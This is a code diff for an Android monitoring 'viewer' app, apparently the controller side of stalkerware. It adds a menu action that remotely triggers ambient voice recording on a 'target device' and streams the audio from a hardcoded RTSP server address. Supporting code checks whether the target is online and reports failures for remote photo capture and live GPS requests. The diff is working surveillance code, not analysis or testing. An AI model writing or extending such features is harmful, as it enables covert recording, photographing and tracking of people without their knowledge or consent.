@@ -12,14 +12,23 @@ package com.scp.viewer.View;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
+import android.app.Activity;
+import android.app.ProgressDialog;
 import android.content.Context;
+import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.pm.PackageManager;
+import android.graphics.Color;
+import android.graphics.drawable.ColorDrawable;
+import android.media.MediaPlayer;
 import android.net.Uri;
 import android.os.AsyncTask;
 import android.os.Bundle;
+import android.os.CountDownTimer;
 import android.os.Handler;
 import androidx.annotation.NonNull;
+import androidx.appcompat.app.AlertDialog;
+import androidx.cardview.widget.CardView;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 import androidx.swiperefreshlayout.widget.SwipeRefreshLayout;
@@ -28,21 +37,30 @@ import androidx.recyclerview.widget.LinearLayoutManager;
 import androidx.recyclerview.widget.RecyclerView;
 import androidx.appcompat.widget.Toolbar;
 import android.util.Log;
+import android.view.LayoutInflater;
 import android.view.Menu;
 import android.view.MenuItem;
+import android.view.MotionEvent;
 import android.view.View;
+import android.widget.ImageView;
 import android.widget.LinearLayout;
+import android.widget.MediaController;
 import android.widget.ProgressBar;
+import android.widget.SeekBar;
 import android.widget.TextView;
 import android.widget.Toast;
+import android.widget.VideoView;
+
 import com.google.gson.Gson;
 import com.scp.viewer.API.APIMethod;
+import com.scp.viewer.API.APIURL;
 import com.scp.viewer.Adapter.AdapterPhoneCallRecordHistory;
 import com.scp.viewer.Database.DatabaseAmbientRecord;
 import com.scp.viewer.Database.DatabaseLastUpdate;
 import com.scp.viewer.Database.DatabasePhoneCallRecord;
 import com.scp.viewer.Model.AmbientRecord;
 import com.scp.viewer.Model.AudioGroup;
+import com.scp.viewer.Model.DeviceStatus;
 import com.scp.viewer.Model.PhoneCallRecordJson;
 import com.scp.viewer.Model.Table;
 import com.scp.viewer.R;
@@ -56,11 +74,14 @@ import java.io.File;
 import java.util.ArrayList;
 import java.util.Calendar;
 import java.util.List;
+import java.util.Objects;
 
 import static com.scp.viewer.API.APIDatabase.getTimeItem;
+import static com.scp.viewer.API.APIMethod.GetJsonCheckConnectionFeature;
 import static com.scp.viewer.API.APIMethod.GetJsonFeature;
 import static com.scp.viewer.API.APIMethod.PostJsonClearDataToServer;
 import static com.scp.viewer.API.APIMethod.alertDialogDeleteItems;
+import static com.scp.viewer.API.APIMethod.getMilliFromDate;
 import static com.scp.viewer.API.APIMethod.getSharedPreferLong;
 import static com.scp.viewer.API.APIMethod.setSharedPreferLong;
 import static com.scp.viewer.API.APIMethod.setToTalLog;
@@ -74,18 +95,25 @@ import static com.scp.viewer.API.APIURL.isConnected;
 import static com.scp.viewer.API.APIURL.noInternet;
 import static com.scp.viewer.API.Global.AMBIENT_RECORDING_TOTAL;
 import static com.scp.viewer.API.Global.File_PATH_SAVE_PHONE_CALL_RECORD;
-import static com.scp.viewer.API.Global.GET_AMBIENT_VOICE_RECORDING;
 import static com.scp.viewer.API.Global.LIMIT_REFRESH;
 import static com.scp.viewer.API.Global.NEW_ROW;
-import static com.scp.viewer.API.Global.NOTIFICATION_PULL_ROW;
 import static com.scp.viewer.API.Global.NumberLoad;
 import static com.scp.viewer.API.Global.PHONE_CALL_RECORDING_PULL_ROW;
 import static com.scp.viewer.API.Global.PHONE_CALL_RECORDING_TOTAL;
 import static com.scp.viewer.API.Global.POST_CLEAR_MULTI_PHONE_RECORDING;
+import static com.scp.viewer.API.Global.TYPE_CHECK_CONNECTION;
+import static com.scp.viewer.API.Global.TYPE_GET_GPS_NOW;
+import static com.scp.viewer.API.Global.TYPE_START_AMBIENT_RECORDING;
+import static com.scp.viewer.API.Global.TYPE_TAKE_A_PICTURE;
 import static com.scp.viewer.API.Global._TOTAL;
+import static com.scp.viewer.API.Global.checkInternet;
 import static com.scp.viewer.API.Global.time_Refresh_Device;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.COLUMN_LAST_PHONE_CALL_RECORDING;
 import static com.scp.viewer.Database.Entity.LastTimeGetUpdateEntity.TABLE_LAST_UPDATE;
+import static com.scp.viewer.View.HistoryLocation.countDownTimer;
+import static com.scp.viewer.View.HistoryLocation.setProgressNow;
+import static com.scp.viewer.View.HistoryLocation.txt_Current_Position;
+import static com.scp.viewer.View.PhotoHistory.txt_Result_Photo;
 
 public class PhoneCallRecordHistory extends AppCompatActivity {
 
@@ -116,6 +144,23 @@ public class PhoneCallRecordHistory extends AppCompatActivity {
     private int currentSize = 0;
     boolean selectAll = false;
     private AVLoadingIndicatorView avLoadingIndicatorView;
+
+
+
+    // Dialog
+    private AlertDialog.Builder mBuilder;
+    private AlertDialog dialog;
+    private ProgressBar PrB_Ambient_Voice_Recording;
+    private VideoView viv_Result;
+    private CardView crv_Ambient_Voice_Recording;
+    private LinearLayout ln_Show_Video, ln_Progress_Ambient_Voice_Recording, ln_Error_Ambient;
+    private TextView txt_Percent, txt_Seconds, txt_Result, txt_Device_Name;
+    public static TextView txt_Error_Detail;
+    private SeekBar sb_Play_Ambient;
+    private String minDateCheck;
+    private ImageView img_Cancel_VideoView;
+    private AVLoadingIndicatorView aviLoadingAmbient;
+    String minDate;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -462,11 +507,285 @@ public class PhoneCallRecordHistory extends AppCompatActivity {
                 stopAnim(avLoadingIndicatorView);
 
             } catch (JSONException e) {
-                MyApplication.getInstance().trackException(e);
+                //MyApplication.getInstance().trackException(e);
                 e.printStackTrace();
             }
         }
     }
+
+
+    /**
+     * setDialog this is the Dialog constructor for the take-a-photo method.
+     */
+    @SuppressLint({"SetTextI18n", "ClickableViewAccessibility"})
+    public void setDialog(final Activity mActivity)
+    {
+        mBuilder = new AlertDialog.Builder(mActivity);
+        @SuppressLint("InflateParams") View mView = LayoutInflater.from(mActivity).inflate(R.layout.item_dialog_pushnotification_ambient_recording, null);
+
+        // Progress Bar
+        PrB_Ambient_Voice_Recording = mView.findViewById(R.id.PrB_Ambient_Voice_Recording);
+
+        // TextView
+        txt_Percent = mView.findViewById(R.id.txt_Percent);
+        txt_Seconds = mView.findViewById(R.id.txt_Seconds);
+        txt_Result = mView.findViewById(R.id.txt_Result);
+        sb_Play_Ambient = mView.findViewById(R.id.sb_Play_Ambient);
+        //txt_Device_Name
+        //txt_Error_Detail
+        txt_Device_Name = mView.findViewById(R.id.txt_Device_Name);
+        txt_Error_Detail = mView.findViewById(R.id.txt_Error_Detail);
+
+        // CardView
+        crv_Ambient_Voice_Recording = mView.findViewById(R.id.crv_Ambient_Voice_Recording);
+
+        // ImageView
+        viv_Result = mView.findViewById(R.id.viv_Result);
+        img_Cancel_VideoView = mView.findViewById(R.id.img_Cancel_VideoView);
+
+        //aviLoadingAmbient
+        aviLoadingAmbient = mView.findViewById(R.id.aviLoadingAmbient);
+        aviLoadingAmbient.setVisibility(View.GONE);
+
+        // LinearLayout
+        ln_Show_Video = mView.findViewById(R.id.ln_Show_Video);
+        ln_Progress_Ambient_Voice_Recording = mView.findViewById(R.id.ln_Progress_Ambient_Voice_Recording);
+        ln_Show_Video.setVisibility(View.GONE);
+        ln_Error_Ambient = mView.findViewById(R.id.ln_Error_Ambient);
+        ln_Error_Ambient.setVisibility(View.GONE);
+
+        mBuilder.setView(mView);
+        dialog = mBuilder.create();
+        Objects.requireNonNull(dialog.getWindow()).setBackgroundDrawable(new ColorDrawable(Color.TRANSPARENT));
+        dialog.setCancelable(false);
+        dialog.show();
+        //txt_Percent.setText(getApplicationContext().getResources().getString(R.string.to_complete,0)+ "%");
+        setProgressNow(0, txt_Percent, PhoneCallRecordHistory.this);
+        img_Cancel_VideoView.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View view) {
+
+                // 1: start ambient
+                // 0: stop ambient
+                new APIMethod.PushNotification(table.getID(), TYPE_START_AMBIENT_RECORDING, table.getDevice_Identifier(), 0).execute();
+                dialog.dismiss();
+            }
+        });
+
+        dialog.setOnDismissListener(new DialogInterface.OnDismissListener() {
+            @Override
+            public void onDismiss(DialogInterface dialogInterface) {
+                // handle when exiting dialog
+                // 1: start ambient
+                // 0: stop ambient
+                new APIMethod.PushNotification(table.getID(), TYPE_START_AMBIENT_RECORDING, table.getDevice_Identifier(), 0).execute();
+            }
+        });
+
+        sb_Play_Ambient.setOnTouchListener(new View.OnTouchListener() {
+            @Override
+            public boolean onTouch(View view, MotionEvent motionEvent) {
+                return true;
+            }
+        });
+    }
+
+    /**
+     * takeAPhoto this is the method to handle the remote photography event
+     * step 1: pushNotification to target app, 1: capture with front camera; 2: taken with the back camera
+     * step 2: wait 20s
+     * step 3: after waiting for 30 seconds, get a new photo and display it on the custom Dialog for users to see directly.
+     */
+    private void ambient_Voice_Recording()
+    {
+        //Take_a_Photo_Font
+        minDateCheck = getTimeNow();
+        // minDateCheck is the time to compare with last online to see if it's too big to show the device is online or offline.
+        setDialog(PhoneCallRecordHistory.this);
+        // Dialog includes: Process name, Progress, Detailed target device information (Display can't get device information when Network Offline)
+        // Display custom process Dialog at 0% Starting...
+        // handle get gps now
+        setProgressNow(20, txt_Percent, PhoneCallRecordHistory.this);
+        // handle check connection
+        // 1: start ambient
+        // 0: stop ambient
+        new APIMethod.PushNotification(table.getID(), TYPE_START_AMBIENT_RECORDING, table.getDevice_Identifier(), 1).execute();
+        new APIMethod.PushNotification(table.getID(), TYPE_CHECK_CONNECTION, table.getDevice_Identifier(), 0).execute();
+        minDate = getTimeNow();
+        // Show Dialog custom process at 30% Push notification to the target app.
+        setProgressNow(30, txt_Percent, PhoneCallRecordHistory.this);
+        countDownTimer(txt_Seconds, txt_Percent, PhoneCallRecordHistory.this);
+        setDePlay(minDate);
+    }
+
+    /**
+     * setDePlay is the method to wait for how many seconds before performing the next steps.
+     */
+    public void setDePlay(final String minDate)
+    {
+        final Handler handler = new Handler();
+        handler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                dialog.setCancelable(false);
+                aviLoadingAmbient.setVisibility(View.VISIBLE);
+                // The processor obtains information about the current state of the target device.
+                ln_Show_Video.setVisibility(View.VISIBLE);
+                ln_Progress_Ambient_Voice_Recording.setVisibility(View.GONE);
+
+                //Creating MediaController
+                MediaController mediaController= new MediaController(PhoneCallRecordHistory.this);
+                mediaController.setAnchorView(viv_Result);
+                //specify the location of media file//table.getID()
+                String ambientURI = "rtsp://69.64.74.242:1935/copy9/" + table.getDevice_Identifier();
+                Log.d("ambientURI", "ambientURI ="+ ambientURI);
+                Uri uri=Uri.parse(ambientURI);
+
+                //Setting MediaController and URI, then starting the videoView
+                viv_Result.setMediaController(mediaController);
+                viv_Result.setVideoURI(uri);
+                viv_Result.requestFocus();
+                //viv_Result.start();
+
+
+                viv_Result.setOnPreparedListener(new MediaPlayer.OnPreparedListener() {
+                    // Close the progress bar and play the video
+                    public void onPrepared(MediaPlayer mp) {
+                        aviLoadingAmbient.setVisibility(View.GONE);
+                        viv_Result.start();
+                        Log.d("viv_Result", "position = viv_Result.start()");
+                    }
+                });
+
+                viv_Result.setOnErrorListener(new MediaPlayer.OnErrorListener() {
+                    @SuppressLint("SetTextI18n")
+                    @Override
+                    public boolean onError(MediaPlayer mp, int what, int extra) {
+                        Log.d("video", "setOnErrorListener ");
+                        aviLoadingAmbient.setVisibility(View.GONE);
+                        ln_Show_Video.setVisibility(View.GONE);
+                        ln_Error_Ambient.setVisibility(View.VISIBLE);
+                        txt_Device_Name.setText("Can't play this video");
+                        // check internet of the target app
+                        // The processor obtains information about the current state of the target device.
+                        new PhoneCallRecordHistory.checkConnectAsyncTask(minDate, table.getDevice_Identifier(), TYPE_START_AMBIENT_RECORDING, PhoneCallRecordHistory.this).execute();
+                        dialog.setCancelable(true);
+                        //txt_Error_Detail.setText();
+                        Log.d("viv_Result", "position = setOnErrorListener");
+                        return true;
+                    }
+                });
+
+                ///count down timer
+                //countDownTimerCheckPlaying(viv_Result, PhoneCallRecordHistory.this, aviLoadingAmbient);
+            }
+        }, 20000);
+    }
+
+    /**
+     * checkConnectAsyncTask this is the AsyncTask method that calls the server to get the latest status information of the target device.
+     */
+    public static class checkConnectAsyncTask extends AsyncTask<String, Void, String>
+    {
+
+        String minDate, device_Identifier, name_Type;
+        Activity activity;
+
+        public checkConnectAsyncTask(String minDate, String device_Identifier, String name_Type, Activity activity) {
+            this.minDate = minDate;
+            this.device_Identifier = device_Identifier;
+            this.name_Type = name_Type;
+            this.activity = activity;
+        }
+
+        @Override
+        protected String doInBackground(String... strings)
+        {
+
+            Log.d("locationId", device_Identifier + "");
+            return GetJsonCheckConnectionFeature(device_Identifier);
+        }
+
+        @SuppressLint("SetTextI18n")
+        @Override
+        protected void onPostExecute(String s) {
+            try {
+
+                // Display custom process Dialog at 70% Get GPS now...
+                APIURL.deviceObject(s);
+                JSONObject jsonObj = new JSONObject(APIURL.bodyLogin.getData());
+
+                if (!APIURL.bodyLogin.getData().isEmpty())
+                {
+                    Gson gson = new Gson();
+                    DeviceStatus deviceStatus = gson.fromJson(String.valueOf(jsonObj), DeviceStatus.class);
+
+                    if(deviceStatus != null && deviceStatus.getLastOnline()!= null
+                            && getMilliFromDate(minDate) < (getMilliFromDate(deviceStatus.getLastOnline()) + 15000))
+                    {
+                        checkInternet = true;
+                    }
+                    else
+                    {
+                        // error when converting Check-Connection data
+                        checkInternet = false;
+                    }
+                }
+                else
+                {
+                    checkInternet = false;
+                }
+
+                // Show error why can't get information like Image, Location, Recording remotely to target device.
+                showErrorInternet(checkInternet, name_Type, activity);
+
+            } catch (JSONException e) {
+                e.printStackTrace();
+                checkInternet = false;
+                // error when get Check-Connection data
+                showErrorInternet(checkInternet, name_Type, activity);
+            }
+        }
+    }
+
+    /**
+     * showErrorInternet is the method of handling that shows that the remote data cannot be retrieved error is caused by the internet or by not enabling its features.
+     * @param checkInternet Network status is on or off
+     * @param name_Type The name of the type of remote data collection includes: Take-A-Photo, Start-Ambient-Voice-Recording, Get-GPS-Now
+     * @param activity main activity of this error
+     */
+    private static void showErrorInternet(boolean checkInternet, String name_Type, Activity activity)
+    {
+        if(checkInternet)
+        {
+            if(name_Type.equals(TYPE_START_AMBIENT_RECORDING))
+            {
+                txt_Error_Detail.setText(activity.getResources().getString(R.string.the_target_s_device_is_currently_offline));
+            }else if(name_Type.equals(TYPE_GET_GPS_NOW))
+            {
+                txt_Current_Position.setText(activity.getResources().getString(R.string.the_target_is_offline_location));
+            }
+            else //name_Type.equals(TYPE_TAKE_A_PICTURE)
+            {
+                txt_Result_Photo.setText(activity.getResources().getString(R.string.the_target_is_offline_photo));
+            }
+        }
+        else
+        {
+            if(name_Type.equals(TYPE_START_AMBIENT_RECORDING))
+            {
+                txt_Error_Detail.setText(activity.getResources().getString(R.string.the_target_is_offline));
+            }else if(name_Type.equals(TYPE_GET_GPS_NOW))
+            {
+                txt_Current_Position.setText(activity.getResources().getString(R.string.the_target_is_offline));
+            }
+            else //name_Type.equals(TYPE_TAKE_A_PICTURE)
+            {
+                txt_Result_Photo.setText(activity.getResources().getString(R.string.the_target_is_offline));
+            }
+        }
+    }
+
 
     @Override
     public void onRequestPermissionsResult(int requestCode,
@@ -475,14 +794,12 @@ public class PhoneCallRecordHistory extends AppCompatActivity {
         switch (requestCode) {
             case EXTERNAL_STORAGE_PERMISSION_CONSTANT: {
 
-                if (grantResults.length > 0
-                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-
+                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
+                {
                     finish();
                     startActivity(getIntent());
                     request = true;
                 } else {
-
                     request = false;
                     Toast.makeText(this, "You please accept the file read permission to save audio!", Toast.LENGTH_LONG).show();
                     finish();
@@ -493,7 +810,10 @@ public class PhoneCallRecordHistory extends AppCompatActivity {
 
     @Override
     public boolean onCreateOptionsMenu(Menu menu) {
-        getMenuInflater().inflate(R.menu.menu_main, menu);
+        if(functionName.equals("GetPhoneRecording"))
+            getMenuInflater().inflate(R.menu.menu_main, menu);
+        else
+            getMenuInflater().inflate(R.menu.menu_action_play_ambient, menu);
         return true;
     }
 
@@ -559,6 +879,15 @@ public class PhoneCallRecordHistory extends AppCompatActivity {
                 mAdapter.notifyDataSetChanged();
             }
 
+        }
+        else if(item.getItemId() ==  R.id.item_Play_Ambient_Recording)
+        {
+            if (APIURL.isConnected(this))
+            {
+                ambient_Voice_Recording();
+            } else {
+                Toast.makeText(this, R.string.TurnOn, Toast.LENGTH_SHORT).show();
+            }
         }
         else if (item.getItemId() == android.R.id.home)
         {
